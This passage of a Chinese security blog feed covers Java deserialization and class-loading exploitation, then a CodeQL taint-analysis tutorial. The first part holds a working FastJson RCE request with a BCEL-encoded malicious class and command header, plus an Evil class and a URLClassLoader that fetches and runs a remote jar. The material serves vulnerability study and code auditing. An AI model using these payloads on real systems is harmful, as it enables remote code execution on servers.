是经过BCEL编码后的类字节码 </span><br><span class="line">driverClassLoader 是一个由FastJson创建的org.apache.bcel.util.ClassLoader 实例。</span><br></pre></td></tr></table></figure><p>在自动setter之后，并没有触发漏洞，只是注入了类名和类加载器。</p><p>导致命令执行就在于FastJson会自动调用getter方法的<code>getConnection()</code>方法</p><p><code>org.apache.commons.dbcp.BasicDataSource</code>本没有<code>connection</code>成员变量，但有一个<code>getConnection()</code>方法</p><p>当<code>getConnection()</code>方法被调用时就会使用注入进来的<code>org.apache.bcel.util.ClassLoader</code>类加载器加载注入进来恶意类字节码</p><p>命令执行带回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko&#x2F;20100101 Firefox&#x2F;99.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 3651</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;xx&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot; : &#123;</span><br><span class="line">        &quot;name&quot;: &#123;</span><br><span class="line">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : &quot;xxx&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3040b575c96d8e1b202298e2b9ac73bf.png" alt="image-20220509173521483"></p><p>还有就是，在Oracle JDK默认也引用了Xalan利用TemplatesImpl这个也行，但是这个要求更多，原理类似但是需要开启<code>SupportNonPublicField</code>特性，比较麻烦就不写了。</p><h1 id="0x05-URLclassloader"><a href="#0x05-URLclassloader" class="headerlink" title="0x05 URLclassloader"></a>0x05 URLclassloader</h1><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>的一个子类</p><p><code>URLClassLoader</code>一看名字就是知道可以远程加载，在漏洞利用的时候可以加载远程的jar来实现远程的类方法调用。</p><h2 id="利用示例："><a href="#利用示例：" class="headerlink" title="利用示例："></a>利用示例：</h2><p>编译打包jar：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.java</span><br><span class="line">jar -cvf evil.jar Evil.class</span><br></pre></td></tr></table></figure><p>恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意这里可以不使用包名</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        StringBuilder var1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        BufferedReader var2 = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(var0).getInputStream()));</span><br><span class="line"></span><br><span class="line">        String var3;</span><br><span class="line">        <span class="keyword">while</span>((var3 = var2.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1.append(var3).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>起一个http服务，把jar放上去，保证可以远程请求到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.urlclassloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1/evil.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            java.net.URLClassLoader ucl = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">"whoami"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的Evil类</span></span><br><span class="line">            Class cmdClass = ucl.loadClass(<span class="string">"Evil"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用Evil类中的exec方法</span></span><br><span class="line">            String out = (String) cmdClass.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">null</span>, <span class="title">cmd</span>)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(out);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行<img src="https://img-blog.csdnimg.cn/img_convert/1559910082da491326ca85a0f437b63a.png" alt=""></p><h1 id="0x06-实验环境"><a href="#0x06-实验环境" class="headerlink" title="0x06 实验环境"></a>0x06 实验环境</h1><p>可以直接参考这个，是我实验环境</p><p>[JavaStudyEnv/classloader at master · godzeo/JavaStudyEnv (github.com)](</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 WEB 漏洞复现和分析 java 开发语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL基础语法</title>
      <link href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="基础QL语法"><a href="#基础QL语法" class="headerlink" title="基础QL语法"></a>基础QL语法</h1><p>CodeQL的查询语法有点像SQL，如果你学过基本的SQL语句，基本模式应该不会陌生。</p><p>结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java // 导入使用的库</span><br><span class="line"></span><br><span class="line">from int i <span class="comment">/* ... 变量声明... */</span></span><br><span class="line">where i = 100 <span class="comment">/* ... 逻辑公式 ... */</span></span><br><span class="line"><span class="keyword">select</span> i <span class="comment">/* ... 表达式 ... */</span></span><br></pre></td></tr></table></figure><p><code>import java</code>，导入使用的库，因为我们分析的项目是java的</p><p><code>from int i</code>，表示我们定义一个变量i，它的类型是int，表示我们获取所有的int类型的数据；</p><p><code>where i = 100</code>, 表示当i等于1的时候，符合条件；（这是<code>=</code> 是一个等于的意思 <code>==</code> ，并不是赋值）</p><p><code>select i</code>，就是输出 i</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e341c31ce621d2aa11a4825b011892a8.png" alt="image-20220306183131091"></p><p>我们经常会用到的ql类库大体如下：</p><table><thead><tr><th align="center">名称</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">Method</td><td align="center">方法类，Method method表示获取当前项目中所有的方法</td></tr><tr><td align="center">MethodAccess</td><td align="center">方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用</td></tr><tr><td align="center">Parameter</td><td align="center">参数类，Parameter表示获取当前项目当中所有的参数</td></tr></tbody></table><p>所有方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9e8c21c0037fd75c248e9e90449b2b9e.png" alt="image-20220305171200362"></p><p>我们再通过Method类内置的一些方法，把结果过滤一下。比如我们获取名字为 CommandExec 的方法名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;CommandExec&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/44d4f1630fc79917f8350278b0f320a6.png" alt="image-20220305171559626"></p><h1 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h1><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><p>比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;getStudent&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>语法解释</p><p>predicate 表示当前方法没有返回值。</p><p>exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。</p></blockquote><h1 id="设置Source和Sink"><a href="#设置Source和Sink" class="headerlink" title="设置Source和Sink"></a>设置Source和Sink</h1><blockquote><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a76a75871d69198b57600b1dda778910.png" alt="image-20220313165135513"></p><h3 id="设置Source"><a href="#设置Source" class="headerlink" title="设置Source"></a>设置Source</h3><p>在CodeQL中我们通过这个格式去设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">具体方法。。。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><p>正常的Spring Boot 框架</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/list"</span>,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ResultData <span class="title">list</span><span class="params">(@ModelAttribute @ApiIgnore CategoryEntity category, HttpServletResponse response, HttpServletRequest request, @ApiIgnore ModelMap model, BindingResult result)</span> </span>&#123;</span><br><span class="line">BasicUtil.startPage();</span><br><span class="line">List categoryList = categoryBiz.query(category);</span><br><span class="line"><span class="keyword">return</span> ResultData.build().success(<span class="keyword">new</span> EUListBean(categoryList,(<span class="keyword">int</span>) BasicUtil.endPage(categoryList).getTotal()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本例中我们设置Source的代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中, 我们可以直接使用。</p><p>注: instanceof 语法是CodeQL提供的语法，后面在CodeQL进阶部分我们会讲到。</p><h3 id="设置Sink"><a href="#设置Sink" class="headerlink" title="设置Sink"></a>设置Sink</h3><p>在CodeQL中我们通过 isSink</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">具体方法。。。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 sink我们就正常的去定义一个construtorCall，然后这个construtorCall限定在processBuilder下就行。</p><p>codeql官方有一个ExternalProcess.qll库里面有一个ArgumentToExec类，这个类会覆盖到这个sink</p><p>那么就直接写一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就设置了一个命令执行的 Sink</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好Source和Sink后，如果一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞。</p><p>比如如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给<code>config.hasFlowPath(source, sink)</code>我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><p>这一段其实基本上都是固定的，都是从Source到sink，不必深究。</p><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @id java/examples/vuldemo</span></span><br><span class="line"><span class="comment"> * @name Rce</span></span><br><span class="line"><span class="comment"> * @description Rce</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = "rceConfig" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; </span><br><span class="line">      src instanceof RemoteFlowSource </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink </span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), <span class="keyword">source</span>, sink, <span class="string">"source"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c2995c18fd69b991e386fb24252b13e5.png" alt="image-20220422112847724"></p><h1 id="isSanitizer方法"><a href="#isSanitizer方法" class="headerlink" title="isSanitizer方法"></a>isSanitizer方法</h1><p>从上面的demo中存在的一个数据，就是误报，这个参数其实是通过了安全函数过滤了，但是还是扫出来了，这种情况就得消除这种误报。就得使用<code>isSanitizer</code>。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e5bfedf32300aa751092d532b2898685.png" alt="image-20220422113007659"></p><p>isSanitizer是CodeQL的类<code>TaintTracking::Configuration</code>提供的净化方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    exists(...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isAdditionalTaintStep方法"><a href="#isAdditionalTaintStep方法" class="headerlink" title="isAdditionalTaintStep方法"></a>isAdditionalTaintStep方法</h1><p>isAdditionalTaintStep方法是CodeQL的类<code>TaintTracking::Configuration</code>提供的的方法，它的原型是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的作用是将一个可控节点<br>A强制传递给另外一个节点B，那么节点B也就成了可控节点。</p><h1 id="批量检测命令"><a href="#批量检测命令" class="headerlink" title="批量检测命令"></a>批量检测命令</h1><p>CodeQL除了提供VSCode的检测插件，也提供了大量的命令行，来实现项目的集成检测。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database analyze 